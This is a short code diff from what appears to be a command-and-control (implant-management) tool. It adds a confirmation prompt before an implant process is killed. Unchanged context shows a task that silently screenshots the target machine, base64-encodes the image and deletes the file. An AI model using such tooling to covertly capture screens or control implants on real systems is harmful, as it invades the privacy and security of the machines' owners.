@@ -376,10 +376,19 @@ def runcommand(command, randomuri):
       taskcmd = "screencapture -x /tmp/s;base64 /tmp/s;rm /tmp/s"
       new_task(taskcmd, randomuri)
 
-    elif "kill-implant" in command.lower():
-      pid = get_pid(randomuri)
-      new_task("kill -9 %s" % pid,randomuri)
-      kill_implant(randomuri)
+    elif "kill-implant" in command.lower() or "exit" in command.lower():
+      impid = get_implantdetails(randomuri)
+      ri = raw_input("Are you sure you want to terminate the implant ID %s? (Y/n) " % impid[0])
+      if ri.lower() == "n":
+        print "Implant not terminated"
+      if ri == "":
+        pid = get_pid(randomuri)
+        new_task("kill -9 %s" % pid,randomuri)
+        kill_implant(randomuri)
+      if ri.lower() == "y":
+        pid = get_pid(randomuri)
+        new_task("kill -9 %s" % pid,randomuri)
+        kill_implant(randomuri)
 
     elif (command == "back") or (command == "clear") or (command == "back ") or (command == "clear "):
       startup() 
